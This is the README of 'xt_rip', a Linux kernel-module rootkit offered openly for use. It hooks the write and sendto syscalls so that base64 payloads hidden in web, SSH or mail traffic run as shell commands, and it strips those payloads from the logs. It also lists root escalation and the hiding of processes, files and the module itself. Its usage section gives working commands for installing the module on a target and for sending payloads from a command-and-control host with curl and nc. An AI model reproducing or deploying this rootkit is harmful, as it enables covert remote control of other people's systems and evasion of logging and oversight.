# xt_rip LKM rootkit
This rootkit is an attempt to use `write` and `sendto` syscalls as input vectors for a remote backdoor.

A lot of user-provided and unsafe data gets processed through those syscalls since they are used to log connections to web server, failed ssh connections etc.

The module replaces the original syscalls by our own functions which looks for a pattern, extract it so it can be parsed as a C&C command, and strips it from the original buffer so it (hopefully) does not appear anywhere in the logs.

## Features
- [x] All features from Diamorphine
    - [x] Hide process with `kill -31 $PID`
    - [x] Hide LKM with `kill -63 1`
    - [x] Give root with `kill -64 1`
    - [x] Hide files and dirs with name matchin prefix
- [x] Hook `write` and `sendto`
    - [x] Read and strip payload from given userland buffer
    - [x] Decode base64 payload
    - [x] Pass payload to /bin/sh
    - [x] Hide generated process
    - [ ] Add mandatory checksum to payload
- [ ] Hide arbitrary network connection (http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-7-SECT-4.html)

## Usage
```sh
## On the target
# Install dependencies (apt only), build
# and install module
make

## From the C&C
# Store marker
$ export XTRIP_MARKER=__8231061ecdb0740331d289cd1051e197afc568b5__

# Generate payload
$ ./client 'id > /tmp/id'
__8231061ecdb0740331d289cd1051e197afc568b5__AwqGpIaVDg1Wl2LK__8231061ecdb0740331d289cd1051e197afc568b5__

# Generate payload and send it to target
# through HTTP on port 80
$ ./client 'id > /tmp/id' $TARGET

# Manually send payload to web server
# on port 443
$ curl -skA"$(./client 'id > /tmp/id')" https://$TARGET/

# Send payload to SSH on port 22
$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 22

# Send payload to Exim4 on port 25
$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 25
```